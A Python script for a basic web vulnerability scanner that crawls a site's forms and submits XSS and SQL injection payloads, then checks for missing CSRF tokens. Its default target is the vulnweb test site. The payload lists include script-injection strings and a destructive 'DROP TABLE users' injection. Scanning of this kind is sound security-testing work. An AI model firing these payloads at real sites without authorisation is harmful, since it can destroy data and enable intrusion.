import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin
import logging

logging.basicConfig(filename='vulnerabilities.log', level=logging.INFO, format='%(asctime)s - %(message)s')

xss_payloads = [
    "<script>alert('xss')</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>"
]
sqli_payloads = [
    "' OR '1'='1",
    "1; DROP TABLE users --",
    "' UNION SELECT 1,2,3 --"
]

def scan_xss(url, forms):
    vulnerabilities = []
    for form in forms:
        action = form['url']
        method = form['method']
        inputs = form['inputs']
        for payload in xss_payloads:
            data = {inp['name']: payload for inp in inputs if inp['name']}
            try:
                if method == 'post':
                    response = requests.post(action, data=data, timeout=5)
                else:
                    response = requests.get(action, params=data, timeout=5)
                if re.search(r"alert\(['\"]?xss['\"]?\)", response.text, re.IGNORECASE):
                    vuln = {
                        'type': 'XSS',
                        'url': action,
                        'payload': payload,
                        'severity': 'High',
                        'evidence': 'Reflected script execution'
                    }
                    vulnerabilities.append(vuln)
                    logging.info(f"XSS found at {action} with payload: {payload}")
            except Exception as e:
                logging.error(f"XSS scan error at {action}: {e}")
    return vulnerabilities

def scan_sqli(url, forms):
    vulnerabilities = []
    for form in forms:
        action = form['url']
        method = form['method']
        inputs = form['inputs']
        for payload in sqli_payloads:
            data = {inp['name']: payload for inp in inputs if inp['name']}
            try:
                if method == 'post':
                    response = requests.post(action, data=data, timeout=5)
                else:
                    response = requests.get(action, params=data, timeout=5)
                if re.search(r"sql syntax|mysql|sqlite|database error", response.text, re.IGNORECASE):
                    vuln = {
                        'type': 'SQLi',
                        'url': action,
                        'payload': payload,
                        'severity': 'Critical',
                        'evidence': 'Database error in response'
                    }
                    vulnerabilities.append(vuln)
                    logging.info(f"SQLi found at {action} with payload: {payload}")
            except Exception as e:
                logging.error(f"SQLi scan error at {action}: {e}")
    return vulnerabilities

def scan_csrf(url, forms):
    vulnerabilities = []
    for form in forms:
        action = form['url']
        try:
            response = requests.get(action, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            if not soup.find('input', {'name': re.compile(r'csrf|token', re.IGNORECASE)}):
                vuln = {
                    'type': 'CSRF',
                    'url': action,
                    'payload': 'None',
                    'severity': 'Medium',
                    'evidence': 'Missing CSRF token in form'
                }
                vulnerabilities.append(vuln)
                logging.info(f"CSRF found at {action}: Missing token")
        except Exception as e:
            logging.error(f"CSRF scan error at {action}: {e}")
    return vulnerabilities

def scan(url):
    from crawler import crawl
    forms, urls = crawl(url)
    vulnerabilities = []
    vulnerabilities.extend(scan_xss(url, forms))
    vulnerabilities.extend(scan_sqli(url, forms))
    vulnerabilities.extend(scan_csrf(url, forms))
    return vulnerabilities

if __name__ == "__main__":
    target = "http://testphp.vulnweb.com"
    vulns = scan(target)
    print("Vulnerabilities:", vulns)
